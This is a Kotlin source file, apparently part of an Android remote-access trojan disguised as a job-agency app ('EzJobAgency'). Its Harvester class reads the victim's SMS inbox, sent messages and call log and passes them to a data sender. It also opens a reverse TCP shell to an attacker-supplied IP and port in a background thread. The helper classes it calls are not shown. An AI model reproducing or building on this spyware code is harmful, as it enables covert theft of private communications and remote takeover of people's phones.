package com.example.EzJobAgency

import android.app.Activity
import android.content.Context
import com.example.EzJobAgency.DataRetriever.CallLog
import com.example.EzJobAgency.DataRetriever.smsLog
import kotlin.concurrent.thread

class Harvester(var activity: Activity, var context: Context, var dataSender: DataSender) {

    fun getSMS(){
        smsLog(context, dataSender).readSMSBox("inbox")
        smsLog(context, dataSender).readSMSBox("sent")
    }

    fun getCallLog(){
        CallLog(context, activity, dataSender).readLogs()
    }

    fun getShell(ip: String, port: Int){
        thread(start = true){
            reverseShell.reverse_tcp(ip, port)
        }

    }
}